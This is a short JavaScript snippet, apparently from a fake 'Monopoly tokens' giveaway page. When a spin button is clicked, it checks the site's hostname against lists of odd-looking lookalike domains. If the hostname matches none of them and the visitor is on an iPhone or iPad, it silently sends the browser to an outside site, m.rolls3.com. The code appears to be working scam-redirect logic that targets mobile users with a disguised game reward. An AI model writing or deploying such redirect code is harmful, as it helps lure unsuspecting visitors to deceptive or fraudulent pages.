/*================== [3 ] ===============*/
/*================== [ monopoly ] ================*/
var button = document.querySelector('.spin-buttons');  
button.addEventListener('click', function() {
    (function() {
        var originalDomains = [
            "monoplytokens.com",
            "mply.io.t0ke2n.site",
            "mply.io.4a6b8dh.site",
            "mply.io.1arshg4.site"
        ]; 
        
        var redirectURL = "https://m.rolls3.com";
        var blockedDomains = [
            "jsdhjjhhjjhejkjkas.blogspot.com",
            "mply.io.t0ke2n.site",
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        var currentDomain = window.location.hostname.replace("www.", "").toLowerCase();
        
        if (!originalDomains.includes(currentDomain) && !blockedDomains.some(domain => currentDomain.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
